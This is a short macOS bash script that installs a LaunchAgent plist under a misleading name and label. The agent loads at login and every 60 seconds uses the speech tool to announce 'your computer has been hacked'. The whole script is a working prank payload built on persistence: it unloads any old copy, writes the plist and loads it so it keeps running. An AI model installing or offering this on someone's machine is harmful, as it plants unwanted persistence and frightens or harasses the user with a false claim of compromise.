#!/usr/bin/env bash
FILE=~/Library/LaunchAgents/lock.me.uk.plist

echo "unloading..."
if [ -f $FILE ]
then
  launchctl unload $FILE
  rm $FILE
fi
echo "writing..."
echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.lock.yo.screen</string>
    <key>RunAtLoad</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
      <string>/usr/bin/say</string>
      <string>your computer has been hacked</string>
    </array>
    <key>StartInterval</key>
    <integer>60</integer>
  </dict>
</plist>' > $FILE
echo "loading..."
launchctl load $FILE
